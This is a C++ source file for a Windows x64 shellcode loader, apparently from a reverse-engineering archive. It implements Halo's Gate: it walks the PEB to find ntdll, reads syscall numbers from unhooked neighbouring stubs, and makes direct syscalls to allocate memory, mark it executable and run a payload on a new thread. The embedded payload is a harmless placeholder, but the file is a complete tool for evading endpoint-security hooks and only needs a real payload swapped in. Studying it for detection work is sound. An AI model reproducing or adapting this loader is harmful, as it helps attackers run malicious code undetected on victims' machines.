/*
    Shellcode Loader
    Archive of Reversing.ID

    Directly invoke NT syscall.
    When the target stub is hooked, infer the SSN from adjacent NT function stubs.
    NT syscall numbers are assigned in ascending order matching the sorted-by-address
    layout of stubs in ntdll, so a neighbor at offset ±k has SSN ±k.

Compile:
    $ ml64.exe /nologo /c halosgate.asm
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tpcode.cpp halosgate.obj

Technique:
    - access:       Halo's Gate (neighbor scan on hook)
    - allocation:   NtAllocateVirtualMemory (halo's gate)
    - writing:      RtlMoveMemory
    - permission:   NtProtectVirtualMemory  (halo's gate)
    - execution:    CreateThread

Note:
    - x64 only (Windows 10+ ntdll stub layout)
    - neighbor scan is Halo's Gate; syscall uses static HalosGate / HaloDescent (no RWX gate alloc)
*/

#ifndef _WIN64
#error "Halo's Gate requires x64 (Windows 10+ ntdll stub layout)"
#endif

#include <windows.h>
#include <stdlib.h>
#include <stdint.h>

extern "C" void  HalosGate (WORD wSystemCall);
extern "C" PVOID HaloDescent (void);

/* ========= PEB / loader structures ========= */
typedef struct _MY_UNICODE_STRING {
    USHORT  Length;
    USHORT  MaximumLength;
    PWSTR   Buffer;
} MY_UNICODE_STRING;

typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY          InLoadOrderLinks;
    LIST_ENTRY          InMemoryOrderLinks;
    LIST_ENTRY          InInitializationOrderLinks;
    PVOID               DllBase;
    PVOID               EntryPoint;
    ULONG               SizeOfImage;
    MY_UNICODE_STRING   FullDllName;
    MY_UNICODE_STRING   BaseDllName;
} MY_LDR_ENTRY, *PMY_LDR_ENTRY;

typedef struct _MY_PEB_LDR_DATA {
    ULONG       Length;
    BOOL        Initialized;
    PVOID       SsHandle;
    LIST_ENTRY  InLoadOrderModuleList;
    LIST_ENTRY  InMemoryOrderModuleList;
    LIST_ENTRY  InInitializationOrderModuleList;
} MY_PEB_LDR_DATA, *PMY_PEB_LDR_DATA;

/* ========= NT function signatures ========= */
typedef NTSTATUS NTAPI NtAllocateVirtualMemory_t(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS NTAPI NtProtectVirtualMemory_t(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

// pointer to function
typedef NtAllocateVirtualMemory_t FAR * pNtAllocateVirtualMemory;
typedef NtProtectVirtualMemory_t  FAR * pNtProtectVirtualMemory;

/* ========= ntdll helpers ========= */

static PVOID get_ntdll_base ()
{
    PMY_PEB_LDR_DATA ldr;
    PLIST_ENTRY      entry;

    // ntdll.dll is always the second entry in InMemoryOrderModuleList
    // (first entry is the main executable)
    ldr   = *(PMY_PEB_LDR_DATA *) (__readgsqword (0x60) + 0x18);
    entry = ldr->InMemoryOrderModuleList.Flink->Flink;
    return CONTAINING_RECORD (entry, MY_LDR_ENTRY, InMemoryOrderLinks)->DllBase;
}

static PVOID get_fn_addr (PVOID base, LPCSTR name)
{
    PBYTE                   b   = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos = (PIMAGE_DOS_HEADER) b;
    PIMAGE_NT_HEADERS       nt  = (PIMAGE_NT_HEADERS) (b + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY) (b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD * names    = (DWORD *) (b + exp->AddressOfNames);
    WORD  * ordinals = (WORD *)  (b + exp->AddressOfNameOrdinals);
    DWORD * funcs    = (DWORD *) (b + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++)
    {
        if (lstrcmpA ((LPCSTR)(b + names[i]), name) == 0)
            return b + funcs[ordinals[i]];
    }
    return NULL;
}

/* ========= SSN extraction ========= */

// clean NT syscall stub starts with: mov r10,rcx (4C 8B D1) + mov eax,imm (B8)
static BOOL is_clean_stub (PBYTE stub)
{
    return stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8;
}

static WORD read_ssn (PBYTE stub)
{
    return *(WORD *)(stub + 4);
}

/* ========= neighbor scan ========= */

#define MAX_SYSCALL_TABLE 512

typedef struct _SC_ENTRY {
    PVOID address;
} SC_ENTRY;

static int sc_cmp (const void * a, const void * b)
{
    const SC_ENTRY * ea = (const SC_ENTRY *) a;
    const SC_ENTRY * eb = (const SC_ENTRY *) b;
    if (ea->address < eb->address) return -1;
    if (ea->address > eb->address) return  1;
    return 0;
}

// build sorted table of all Nt* stub addresses from ntdll export table
static DWORD build_nt_table (PVOID base, SC_ENTRY * table)
{
    PBYTE                   b   = (PBYTE) base;
    PIMAGE_DOS_HEADER       dos = (PIMAGE_DOS_HEADER) b;
    PIMAGE_NT_HEADERS       nt  = (PIMAGE_NT_HEADERS) (b + dos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY) (b +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD * names    = (DWORD *) (b + exp->AddressOfNames);
    WORD  * ordinals = (WORD *)  (b + exp->AddressOfNameOrdinals);
    DWORD * funcs    = (DWORD *) (b + exp->AddressOfFunctions);
    DWORD   count    = 0;

    for (DWORD i = 0; i < exp->NumberOfNames && count < MAX_SYSCALL_TABLE; i++)
    {
        LPCSTR name = (LPCSTR)(b + names[i]);
        // collect only Nt* functions that look like syscall stubs
        if (name[0] == 'N' && name[1] == 't')
        {
            PVOID fn = b + funcs[ordinals[i]];
            // include hooked and clean stubs — we just need the address order
            table[count++].address = fn;
        }
    }

    qsort (table, count, sizeof (SC_ENTRY), sc_cmp);
    return count;
}

static BOOL halos_gate (PVOID ntdll_base, LPCSTR fn_name, PWORD out_ssn)
{
    PVOID fn = get_fn_addr (ntdll_base, fn_name);
    if (!fn) return FALSE;

    // if stub is clean, read SSN directly
    if (is_clean_stub ((PBYTE) fn))
    {
        *out_ssn = read_ssn ((PBYTE) fn);
        return TRUE;
    }

    // stub is hooked: build sorted table and scan neighbors
    SC_ENTRY table[MAX_SYSCALL_TABLE];
    DWORD    count = build_nt_table (ntdll_base, table);

    // find our function's position in the sorted address table
    DWORD target_idx = count;
    for (DWORD i = 0; i < count; i++)
    {
        if (table[i].address == fn)
        {
            target_idx = i;
            break;
        }
    }
    if (target_idx == count) return FALSE;

    // scan neighbors: nearest clean stub reveals target SSN by ±offset
    for (DWORD k = 1; k < count; k++)
    {
        if (target_idx + k < count && is_clean_stub ((PBYTE) table[target_idx + k].address))
        {
            *out_ssn = read_ssn ((PBYTE) table[target_idx + k].address) - (WORD) k;
            return TRUE;
        }
        if (target_idx >= k && is_clean_stub ((PBYTE) table[target_idx - k].address))
        {
            *out_ssn = read_ssn ((PBYTE) table[target_idx - k].address) + (WORD) k;
            return TRUE;
        }
    }

    return FALSE;
}

/* ======================================================= */

int main ()
{
    void *   runtime     = NULL;
    SIZE_T   size;
    ULONG    old_protect = 0;
    NTSTATUS status;
    HANDLE   h_thread;

    uint8_t  payload []  = { 0x90, 0x90, 0xCC, 0xC3 };
    uint32_t payload_len = 4;

    WORD ssn_alloc   = 0;
    WORD ssn_protect = 0;

    PVOID ntdll = get_ntdll_base ();

    if (!halos_gate (ntdll, "NtAllocateVirtualMemory", &ssn_alloc))   return 1;
    if (!halos_gate (ntdll, "NtProtectVirtualMemory",  &ssn_protect)) return 1;

    size   = payload_len;
    HalosGate (ssn_alloc);
    status = ((pNtAllocateVirtualMemory) HaloDescent) (
        GetCurrentProcess (),
        &runtime,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    if (status != 0) return 1;

    RtlMoveMemory (runtime, payload, payload_len);

    size   = payload_len;
    HalosGate (ssn_protect);
    status = ((pNtProtectVirtualMemory) HaloDescent) (
        GetCurrentProcess (),
        &runtime,
        &size,
        PAGE_EXECUTE_READ,
        &old_protect
    );
    if (status == 0)
    {
        h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (h_thread, -1);
    }

    return 0;
}
